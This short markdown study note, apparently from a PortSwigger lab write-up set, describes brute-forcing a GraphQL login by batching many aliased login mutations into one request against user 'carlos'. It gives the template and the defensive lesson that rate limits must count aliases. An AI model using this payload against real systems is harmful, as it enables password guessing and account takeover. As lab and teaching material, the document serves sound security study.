# Alias Brute-Force Generator From the Source

The supplied source provides a JavaScript browser-console helper that converts the authentication lab password list into aliased login mutations.

For exact preservation, see `00-Original-PortSwigger-Content.md` around the Lab 04 section. The key generated structure is:

```graphql
mutation {
    bruteforce0:login(input:{password: "<password>", username: "carlos"}) {
        token
        success
    }
    bruteforce1:login(input:{password: "<password>", username: "carlos"}) {
        token
        success
    }
}
```

## Important

Use this only against the intended PortSwigger lab or another system for which you have explicit authorization. The security lesson is that server-side limits should count GraphQL operations/aliases, not only HTTP requests.
